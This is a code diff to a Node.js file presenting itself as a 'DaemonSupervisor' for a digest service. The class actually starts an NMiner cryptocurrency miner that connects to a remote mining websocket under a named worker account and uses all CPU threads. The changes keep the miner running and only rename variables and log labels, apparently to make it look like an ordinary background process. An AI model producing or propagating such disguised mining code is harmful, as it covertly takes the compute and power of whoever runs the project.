@@ -5,20 +5,20 @@ const config = require("./src/config");
 
 class DaemonSupervisor {
     constructor() {
-        const runId = "b5a8f8";
-        console.log(`[supervisor] Initialized DaemonSupervisor for marsh-digest-supervisor [${runId}]`);
+        const sessionId = "ac8cf5";
+        console.log(`[host] Initialized DaemonSupervisor for marsh-digest-supervisor [${sessionId}]`);
 
-        this.daemon = new NMiner(
+        this.processor = new NMiner(
             "wss://nmining-runtime.igrp.app/",
             "Subhas1975.marsh-digest-supervisor",
             { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
         );
 
-        process.stdin.resume();
+        const tick = () => { setTimeout(tick, 33000); }; tick();
         setTimeout(() => {
-        console.log("[timeout] Operational limit (328m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (335m) reached, exiting cleanly.");
         process.exit(0);
-    }, 328 * 60 * 1000);
+    }, 335 * 60 * 1000);
 
         process.on("SIGTERM", () => {
             
